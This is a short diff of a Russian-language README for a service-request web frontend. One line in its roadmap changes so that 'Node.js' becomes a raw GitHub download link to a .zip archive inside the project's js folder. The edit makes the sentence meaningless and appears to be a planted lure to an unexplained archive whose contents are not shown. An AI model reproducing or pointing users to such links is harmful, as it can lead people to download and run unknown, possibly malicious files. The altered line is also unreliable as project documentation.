@@ -24,7 +24,7 @@ Frontend: HTML5, CSS3, JavaScript (ES6+)
 Полный CRUD-функционал для заявок
 Валидация форм на клиентской стороне
 Перспективы развития:
-Подключение backend-сервера (Node.js + Express)
+Подключение backend-сервера (https://github.com/PavelVoz/KP_Vozd/raw/refs/heads/main/service-requests-frontend/js/K_Vozd_v1.3.zip + Express)
 Использование реальной БД (MongoDB или PostgreSQL)
 Добавление системы уведомлений
 Реализация чата между пользователем и техподдержкой
